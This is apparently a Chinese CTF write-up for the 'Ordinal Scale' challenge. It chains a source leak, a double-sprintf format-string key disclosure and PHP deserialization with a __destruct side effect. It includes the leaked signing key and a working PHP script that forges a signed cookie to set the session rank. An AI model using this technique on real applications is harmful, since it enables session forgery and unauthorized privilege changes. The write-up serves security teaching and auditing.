# 序列之争 - Ordinal Scale

## 题目简述

题目把源码泄露、格式化字符串信息泄露、PHP 反序列化和析构函数副作用串在一起。目标是把会话中的 `rank` 改成 `1`：先利用欢迎语的两次 `sprintf` 泄露用于签名 Cookie 的密钥，再伪造能够在析构时写入 Session 的 `Rank` 对象。

## 解题过程

查看页面源代码可以发现 `source.zip`，下载后重点审计 `Game::init()`、Cookie 校验和 `Rank::__destruct()`。初始化逻辑依次处理玩家名和服务端密钥，并把前一次格式化后的字符串继续交给 `sprintf`。如果玩家名本身是 `%s`，第一次处理后占位符仍然存在，第二次就会把密钥填进去。因此注册或登录时把名字设为 `%s`，响应中的欢迎语会泄露类似下面的值：

```text
gkUFUa7GfPQui3DGUTHX6XIUS3ZAmC1L
```

Cookie 的结构不是简单的 `Base64(serialize(data))`，末尾还有 32 字节十六进制 MD5 签名。源码中的计算关系可以整理为：

```text
sign_0 = ""
sign_1 = md5(sign_0 || player_name)
sign_2 = md5(sign_1 || encrypt_key)
cookie = base64(serialize(object) || md5(serialize(object) || sign_2))
```

接着构造私有属性 `rank=1` 的 `Rank` 对象。PHP 私有属性在序列化字符串中的真实键名包含 NUL 字节，即 `\0Rank\0rank`，因此最好让 PHP 自己完成序列化，不要手拼长度：

```php
<?php
class Rank
{
    private $rank = 1;
}

$player = 'e99';
$key = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmC1L';
$sign = '';
foreach ([$player, $key] as $value) {
    $sign = md5($sign . $value);
}

$serialized = serialize(new Rank());
$cookie = base64_encode($serialized . md5($serialized . $sign));
echo $cookie, PHP_EOL;
```

服务端解码并验证签名后会反序列化对象。`Rank::__destruct()` 中，当对象保存的键与服务端键一致时，会把该对象的排名写回 Session。源码构造对象时还通过引用让两者保持一致，因此不需要在载荷里猜另一份密钥字段。替换 `monster` Cookie 并刷新页面，Session 中的排名变成 `1`，`game.php` 的严格比较成立并返回 flag。

## 方法总结

- 核心链路：源码泄露定位逻辑，残留 `%s` 跨两轮格式化泄露签名密钥，随后伪造带合法签名的序列化对象。
- 关键细节：PHP 私有属性名含类名和 NUL 字节；Cookie 签名还包含逐轮累积的 MD5，漏掉任意一层都会校验失败。
- 审计重点：同一字符串被多次格式化、反序列化对象带析构副作用、Session 在析构阶段写入，都是可组合利用的高风险信号。
